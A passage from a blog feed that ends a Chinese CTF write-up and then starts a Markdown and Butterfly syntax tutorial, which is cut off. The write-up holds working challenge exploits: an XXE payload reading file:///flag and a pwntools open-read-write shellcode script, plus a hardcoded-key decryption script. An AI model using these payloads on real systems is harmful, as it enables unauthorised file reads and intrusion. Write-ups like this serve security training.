模拟隐藏文件内容  </span></span><br><span class="line">hidden_file_content = <span class="string">f&quot;解密密钥: <span class="subst">&#123;encryption_key&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 指定安全的文件根目录  </span></span><br><span class="line">SAFE_ROOT_DIR = os.path.abspath(<span class="string">&#x27;/app&#x27;</span>)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(SAFE_ROOT_DIR, <span class="string">&#x27;hidden.txt&#x27;</span>), <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(hidden_file_content)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logs&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logs</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;logs.html&#x27;</span>, log_content=log_content)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;secret.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():  </span><br><span class="line">    file_name = request.args.get(<span class="string">&#x27;name&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;no_file_name.html&#x27;</span>)  </span><br><span class="line">    full_path = os.path.abspath(os.path.join(SAFE_ROOT_DIR, file_name))  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> full_path.startswith(SAFE_ROOT_DIR) <span class="keyword">or</span> <span class="string">&#x27;config&#x27;</span> <span class="keyword">in</span> full_path:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;no_premission.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(full_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            content = f.read()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;file_content.html&#x27;</span>, content=content)  </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;file_not_found.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>审计发现有加密逻辑，根据源码找到密钥和密文。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/415983e6-a20f-4a6a-a820-c2b4be914ec6.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c4626f03-0c5e-4ac8-8466-ecde3467df03.png" alt="alt text"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;d9d1c4d9e0a48fcec8df61986964ac9794d692a8c5a4cba66a6b696ea0c693d698a68f9bc8da676596b4&quot;</span>  </span><br><span class="line">key = <span class="string">&quot;secret_key1547&quot;</span>  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_encrypt</span>(<span class="params">text, key</span>):  </span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):  </span><br><span class="line">        char = text[i]  </span><br><span class="line">        key_char = key[i % <span class="built_in">len</span>(key)]  </span><br><span class="line">        encrypted.append(<span class="built_in">ord</span>(char) + <span class="built_in">ord</span>(key_char))  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Encrypted char: <span class="subst">&#123;char&#125;</span>, Key char: <span class="subst">&#123;key_char&#125;</span>, Hex: <span class="subst">&#123;<span class="built_in">hex</span>(char)&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_decrypt</span>(<span class="params">encrypted_text, key</span>):  </span><br><span class="line">    decrypted = <span class="built_in">bytearray</span>()  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_text), <span class="number">2</span>):  </span><br><span class="line">        hex_char = encrypted_text[i:i+<span class="number">2</span>]  </span><br><span class="line">        char = <span class="built_in">chr</span>(<span class="built_in">int</span>(hex_char, <span class="number">16</span>))  </span><br><span class="line">        key_char = key[i // <span class="number">2</span> % <span class="built_in">len</span>(key)]  </span><br><span class="line">        decrypted.append(<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(key_char))  </span><br><span class="line">        <span class="built_in">print</span>(decrypted)  </span><br><span class="line">    <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">flag = simple_decrypt(text, key)  </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/54fa94a6-fcdb-4282-be4d-34122e4ca634.png" alt="alt text"></p><h1>XML</h1><p>打<code>XXE</code>漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1d529ab0-d3e8-4a5e-93ad-e4f37941c612.png" alt="alt text"></p><h1>flowzip</h1><p>流量包分析，翻着翻着就找到了。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/82279777-04cb-418c-bab9-0f631e409685.png" alt="alt text"></p><h1>ezEvtx</h1><p>windows系统中，4663是访问文件成功的事件ID<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/0e5cf0ca-ce5e-4021-9018-4e1935b9a566.png" alt="alt text"></p><h2 id="Enigma">Enigma</h2><p>将他给的密文复制，<br>[<img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/85cf6cba-2361-4a13-87b5-7a3f494ec4a1.png" alt="alt text"><br>复制到本地cyberchef里面，使用<code>Enigma</code>解密即可<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/25f09894-3345-4266-8041-18619030dedf.png" alt="alt text"></p><h1>ShadowPhases</h1><p>动态调试可出<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/afa1ef6c-293c-478f-8cba-3ba93a2e4138.png" alt="alt text"></p><h1>RuneBreach</h1><p>orw类型题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./chall&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)  </span><br><span class="line"><span class="comment"># sh = remote(&quot;&quot;, )  </span></span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;\nDefend? (y/N): &quot;</span>, <span class="string">b&#x27;N&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;\nDefend? (y/N): &quot;</span>, <span class="string">b&#x27;N&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;\nDefend? (y/N): &quot;</span>, <span class="string">b&#x27;N&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;\nDefend? (y/N): &quot;</span>, <span class="string">b&#x27;N&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">b&quot;\n[System] Game Over...\n&quot;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Your place is mine now &#x27;</span>)  </span><br><span class="line">addr = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>), <span class="number">16</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;addr&quot;</span>, <span class="built_in">hex</span>(addr))  </span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>) <span class="comment"># 打开flag文件  </span></span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, addr, <span class="number">0x50</span>)  <span class="comment"># 读取flag到mmap区域  </span></span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, addr, <span class="number">0x50</span>) <span class="comment"># 将flag内容输出到标准输出  </span></span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;[BOSS] Say your last word to your territory: &#x27;</span>)  </span><br><span class="line">sh.sendline(asm(shellcode))  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>还是比较菜，不太会哟</p><p>本地跑出来<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/96997e61-119c-4916-af7c-91610bf62cce.png" alt="alt text"></p>]]></content>
    
    
    <summary type="html">还是菜，得多练</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Markdown语法与外挂标签写法汇总</title>
    <link href="https://www.xvzhang.fun/posts/2013454d.html"/>
    <id>https://www.xvzhang.fun/posts/2013454d.html</id>
    <published>2022-08-09T10:19:03.000Z</published>
    <updated>2022-10-23T14:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1>1.Markdown语法自带格式</h1><div class="note info flat"><p>参考：<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown语法图文全面详解(10分钟学会)</a></p></div><div class="note warning flat"><p>注意：此页面偶尔会存在CSS冲突问题!</p></div><h2 id="1-1-代码块">1.1 代码块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-2-多级标题">1.2 多级标题</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>见本文章标题!</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-3-文字样式">1.3 文字样式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线演示<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">文字<span class="strong">**加粗**</span>演示</span><br><span class="line"></span><br><span class="line">文字<span class="emphasis">*斜体*</span>演示</span><br><span class="line"></span><br><span class="line">文本<span class="code">`高亮`</span>演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">MistyRose</span>&gt;</span></span>这里的背景色是：MistyRosen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><u>下划线演示</u></p><p>文字<strong>加粗</strong>演示</p><p>文字<em>斜体</em>演示</p><p>文本<code>高亮</code>演示</p><p>文本<s>删除</s>线演示</p><p><font size = 5>5号字</font><br><font face="黑体">黑体</font><br><font color=blue>蓝色</font></p><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRosen，此处输入任意想输入的内容</td></tr></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note info flat"><p>上述要点可参考:<a href="https://blog.csdn.net/qq_43732429/article/details/108034518">【Markdown语法】字体颜色大小及文字底色设置</a></p></div><h2 id="1-4-引用">1.4 引用</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; 二级引用演示</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;外键</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;事务</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**行级锁**</span>(引用内部一样可以用格式)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><blockquote><p>Java<br>二级引用演示<br>MySQL</p><blockquote><p>外键</p><p>事务</p><p><strong>行级锁</strong>(引用内部一样可以用格式)</p></blockquote><p>…</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-5-分割线">1.5 分割线</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><hr><hr><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-6-列表-跟空格都可以">1.6 列表(*,+,-跟空格都可以)</h2><h3 id="1-6-1-无序列表">1.6.1 无序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> Java</span><br><span class="line"><span class="bullet">*</span> Python</span><br><span class="line"><span class="bullet">*</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Java</span><br><span class="line"><span class="bullet">+</span> Python</span><br><span class="line"><span class="bullet">+</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> Java</span><br><span class="line"><span class="bullet">-</span> Python</span><br><span class="line"><span class="bullet">-</span> ...</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="1-6-2-有序列表">1.6.2 有序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 注意后面有空格</span></span><br><span class="line"><span class="bullet">1.</span> </span><br><span class="line"><span class="bullet">2.</span> </span><br><span class="line"><span class="bullet">3.</span> </span><br><span class="line"><span class="bullet">4.</span> </span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li></li><li></li><li></li><li></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-7-图片">1.7 图片</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 本地图片</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/pusheencode.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="section"># 在线图片</span></span><br><span class="line">![<span class="string">code</span>](<span class="link">https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>本地图片:<br><img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /><br>在线图片:<br><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-8-表格">1.8 表格</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 项目标号 | 资金     | 备注 |</span><br><span class="line">| -------- | -------- | ---- |</span><br><span class="line">| 1        | 100，000 | 无   |</span><br><span class="line">| 2        | 200，000 | 无   |</span><br><span class="line">| 3        | 300,600  | 重要 |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th>项目标号</th><th>资金</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>100，000</td><td>无</td></tr><tr><td>2</td><td>200，000</td><td>无</td></tr><tr><td>3</td><td>300,600</td><td>重要</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-9-公式">1.9 公式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\Gamma(z)=\int<span class="emphasis">_0^\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt.</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>\Gamma(z)=\int_0^\infty t^{z-1}e^{-t}dt.<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1>2.Butterfly外挂标签</h1><div class="note info flat"><p>这部分参考安知鱼:<a href="https://anzhiy.cn/posts/7d58.html">基于Butterfly的外挂标签引入</a></p></div><h2 id="2-1-行内文本样式-text">2.1 行内文本样式 text</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% u 文本内容 %&#125;</span><br><span class="line">&#123;% emp 文本内容 %&#125;</span><br><span class="line">&#123;% wavy 文本内容 %&#125;</span><br><span class="line">&#123;% del 文本内容 %&#125;</span><br><span class="line">&#123;% kbd 文本内容 %&#125;</span><br><span class="line">&#123;% psw 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div 